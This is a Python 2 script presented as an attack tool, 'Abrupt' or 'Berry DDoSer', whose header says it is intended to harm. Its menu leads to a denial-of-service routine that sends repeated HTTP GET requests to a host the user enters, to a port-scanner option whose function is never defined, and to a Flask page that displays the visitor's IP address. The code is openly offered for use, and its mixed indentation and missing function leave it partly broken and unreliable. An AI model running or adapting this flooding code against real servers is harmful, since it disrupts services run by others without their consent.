#usr/bin/python
#+------------------------------------------------+
#|Please note that this code is intended to harm. |
#|Please use with CAUTION!					      |	
#|Use of this script is beyond the developer.     |
#|@strrrry is the author					      |	
#+------------------------------------------------+
"""
"""

__name = 'Abrupt'
__author = '@strrrry'
__email = 'zeekthegeek291@gamil.com'
__website = 'http://abrupt.github.io/'


import time,os,sys,string,random,subprocess,re,socket,httplib
from flask import Flask
from termcolor import colored, cprint
from colorama import *
init()

#Extra Shizzzz / Not really important :/
version = "0.0.2]"
subprocess.call('clear', shell=True)

def user_agents():
	useragents = []
	return(useragents)

def main():
	#Main Banner
	print(Fore.RED + "\t  ,/         \.  ")
	print("\t ((           )) ")
	print("\t  \`.       ,'   ")
	print("\t   )')     (`(	  ")
	print("\t ,'`/       \,`. ")
	print("\t(`-(         )-')")
	print("\t  \-')     (`-/  ")
	print("\t  /`'       `'\  ")
	print("\t (  _       _  ) ")
	print("\t | ( \     / ) | ")
	print("\t |  `.\   /,'  | ")
	print("\t |    `\ /'    | ")
	print("\t (             ) ")
	print("\t  \           /  ")
	print("\t   \         /   ")
	print("\t    `.     ,'    ")
	print("\t      `-.-'      ")
	print("\t             [v" + version)
        print "\nSelect option:"
        print
        print "\t [1] Berry DDoSer"
        print "\t [2] Berry Port Scanner (Currently Still in Beta)"
        print "\t [3] Berry Web"
	print "\n0) To Exit"
        print
        print

        choice = raw_input(Fore.BLUE + 'berry > ')
        print

        if choice == '1':
        	try:
        		print("NOTE - Enter IP or URL")
	        	print ("\n[!] DDoS Mode Loading")
	        	time.sleep(2)
	        	#params for dos
	        	host = raw_input('Enter Host: ')	
	        	host = host.replace("http://","")
	        	open_port = 80
	        	conn = raw_input("Number of Packets: ")
	        	cprint("<--Loading DDoS Attack-->", 'yellow', attrs=['bold'])
	        	time.sleep(6)
	        	message = "@strrrry is an eGod!!!"
	        	ip = socket.gethostbyname(host)

        	except KeyboardInterrupt:
				raw_input("\n\n\t[!] Shutting Down...")
				exit()

        	def ddos_run():
        		ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        		try:
        			#start ddos attack
        			ddos.connect((host, open_port))
        			ddos.send( "GET /%s HTTP/1.1\r\n" % message )
			        ddos.sendto( "GET /%s HTTP/1.1\r\n" % message, (ip, open_port) )
			        ddos.send( "GET /%s HTTP/1.1\r\n" % message )
        		except socket.error, msg:
        			print("\n\t[!] [Connection Failed]")
        			exit()
        		cprint("[" + time.ctime(time.time()) + "]" + " [Attack Serving on port: %s]" % open_port, 'cyan', attrs=['bold'])
        		cprint ("[%s]" % ip, 'yellow', attrs=['bold'])
        		ddos.close()

        	for i in xrange(int(conn)):
        		ddos_run()

        if choice == '2':

        	port_scanner()
						
        if choice == '3':
        	#Run webgui
			app = Flask(__name__)

			@app.route("/")
			def web_start():
			    return '''
			   <html>
				<head>
					<style>
					 body{
					 	background-color: #000;
					}
					h1 {
						font-size: 45px
					}
					h2 {
						font-size: 30px
					}
				</style>
				</head>
				<body>
				<center>
					<h1 style="color: red;">Berry DDoSer</h1>
				    <h2 style="color: white;" id="ipaddress"></h2>
				</center>
				</body>
				<script>
					window.onload = function () {
			        var script = document.createElement("script");
			        script.type = "text/javascript";
			        script.src = "http://www.telize.com/jsonip?callback=DisplayIP";
			        document.getElementsByTagName("head")[0].appendChild(script);
			    };
			    function DisplayIP(response) {
			        document.getElementById("ipaddress").innerHTML = "Your IP Address is " + response.ip;
			    }
				</script>
				</html>
			    '''

			if __name__ == "__main__":
				app.run()

        if choice == "exit" or choice == '0' or choice == '':
        	#exit in any case
            raw_input("\t[!] Quiting Session...")
            print("\n[!] Session Closed.")
            exit()


if __name__ == '__main__':
		main()
		
	                                             